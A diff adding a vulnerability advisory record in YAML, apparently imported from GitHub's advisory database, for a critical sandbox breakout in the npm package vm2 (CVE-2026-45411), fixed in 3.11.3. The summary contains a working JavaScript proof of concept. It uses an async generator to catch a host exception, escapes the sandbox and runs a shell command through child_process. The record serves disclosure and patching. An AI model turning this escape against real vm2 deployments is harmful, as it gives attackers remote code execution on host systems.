@@ -1,0 +1,58 @@
+advisory_id: GHSA-248r-7h7q-cr24
+datasource_id: github_osv_importer_v2/GHSA-248r-7h7q-cr24
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-248r-7h7q-cr24/GHSA-248r-7h7q-cr24.json
+aliases:
+  - CVE-2026-45411
+summary: "vm2 Has a Sandbox Breakout Using Async Generator\n### Summary\n\nVM2 suffers from\
+  \ a sandbox breakout vulnerability. This allows attackers to write code which can escape from\
+  \ the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nIt\
+  \ is possible to catch a host exception using the `yield*` expression inside an async generator.\
+  \ When the generator is closed using the `return` function, the value is awaited on and exceptions\
+  \ thrown in the `then` call will be catched by the runtime and passed to the `yield*` iterator\
+  \ as the next value.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\n\
+  console.log(vm.run(`\nclass E extends Error {}\nfunction so(d) {\n\tif (d > 0) so(d-1);\n\t\
+  const e = new E();\n\te.stack;\n\tthrow e;\n}\nasync function* helper() {\n\tyield* {\n\t\t\
+  [Symbol.asyncIterator]: ()=>({\n\t\t\tnext: v=>({value: v, done: false})\n\t\t})\n\t};\n}\n\
+  async function doCatch(f) {\n\tconst i=helper();\n\tawait i.next();\n\tconst v = await i.return({then(r){f();r();}});\n\
+  \treturn v.value;\n}\n(async function f() {\n\tlet min = 0;\n\tlet max = 10000000;\n\twhile\
+  \ (min<max) {\n\t\tconst mid = (min+max)>>1;\n\t\tconst e = await doCatch(()=>so(mid));\n\t\
+  \tif (e.name===\"RangeError\" && !(e instanceof RangeError)) {\n\t\t\te.constructor.constructor(\"\
+  return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t\t\treturn;\n\
+  \t\t}\n\t\tif (e instanceof E) {\n\t\t\tmin = mid+1;\n\t\t} else {\n\t\t\tmax = mid;\n\t\t\
+  }\n\t}\n})();\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under\
+  \ the assumption that arbitrary code can be executed inside the context of a vm2 sandbox."
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.11.2
+    fixed_versions: vers:npm/3.11.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-248r-7h7q-cr24/GHSA-248r-7h7q-cr24.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-668
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/093494c0c3ef2390d2e56909f9d56e290e6f18b0
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.3
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-45411
+    reference_type:
+    reference_id: CVE-2026-45411
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24
+    reference_type: other
+    reference_id: GHSA-248r-7h7q-cr24
